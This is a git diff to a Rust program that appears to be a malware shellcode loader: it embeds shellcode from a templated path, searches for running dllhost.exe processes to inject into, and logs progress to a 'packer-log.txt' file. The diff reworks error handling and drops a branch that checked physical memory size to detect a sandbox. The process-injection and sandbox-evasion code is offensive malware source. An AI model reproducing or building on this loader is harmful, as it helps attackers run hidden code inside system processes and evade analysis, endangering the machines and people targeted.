@@ -95,17 +95,15 @@ fn main() {
     let tar: &str = "dllhost.exe";
     let file_path = "packer-log.txt";
 
-    append_to_file(file_path, b"Injecting into dllhost.exe");
-
+    if let Err(error) = append_to_file(file_path, b"Injection began!") {
+        eprintln!("Error appending to file: {}", error);
+    } else {
+        println!("Data appended to file successfully.");
+    }
     let mut memory = 0;
     unsafe {
         let is_quicksand = GetPhysicallyInstalledSystemMemory(&mut memory);
         println!("{:#?}", is_quicksand);
-        if is_quicksand != 1 {
-            append_to_file(file_path, b"Quicksand!");
-        } else {
-            append_to_file(file_path, b"Not in quicksand");
-        }
     }
 
     let buf = include_bytes!({{PATH_TO_SHELLCODE}});
@@ -115,7 +113,11 @@ fn main() {
     }
     let list: Vec<usize> = boxboxbox(tar);
     if list.len() == 0 {
-        append_to_file(file_path, b"Unable to find process dllhost.exe");
+        if let Err(error) = append_to_file(file_path, b"Cannot find process dllhost.exe!") {
+            eprintln!("Error appending to file: {}", error);
+        } else {
+            println!("Data appended to file successfully.");
+        }
         println!("[-] Unable to find a process.");
     } else {
         for i in &list {
